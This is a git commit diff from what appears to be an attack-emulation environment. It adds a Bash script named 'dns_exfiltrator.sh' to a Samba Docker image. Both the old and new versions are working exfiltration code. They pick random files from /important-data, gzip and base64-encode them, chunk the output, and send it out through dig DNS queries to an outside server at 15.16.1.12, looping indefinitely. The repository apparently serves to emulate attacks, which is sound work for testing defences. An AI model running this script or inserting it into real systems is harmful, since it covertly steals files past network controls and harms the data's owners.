1c9f9ff299eae5bded7794cf952e551b89270e51
Marco Campione <per.registrazionifalse@gmail.com>
2025-04-04 16:47:53 +0300

    feat: samba dns exfiltrator

--- emulation-system/derived_images/samba_1/docker/dns_exfiltrator.sh
+++ emulation-system/derived_images/samba_1/docker/dns_exfiltrator.sh
@@ -1,8 +1,11 @@
 #!/bin/bash
 
-while [[ true ]]; do
-  #execute shell script
-  f=$(ls /important-data | shuf -n 1); s=4; b=57; c=0; for r in $(for i in $(gzip -c "/important-data/$f" | base64 -w0 | sed "s/.\{$b\}/&\n/g"; echo -e "\n=end="); do if [[ "$c" -lt "$s" ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done); do dig @15.16.1.12 `echo -ne $r$f | tr "+" "*"` +short; done
-  sleep 10
-done
+FOLDER="/important-data/"
 
+while [[ true ]]; do
+  # Select a random file from the specified folder
+  FILE=$(find "$FOLDER" -type f | shuf -n 1)
+  #execute shell script
+  f=$FILE; s=4;b=40;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g";echo -e "\n=end=");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done ); do dig @15.16.1.12 `echo -ne $r$f|tr "+" "*"` +short; done
+  sleep 20
+done
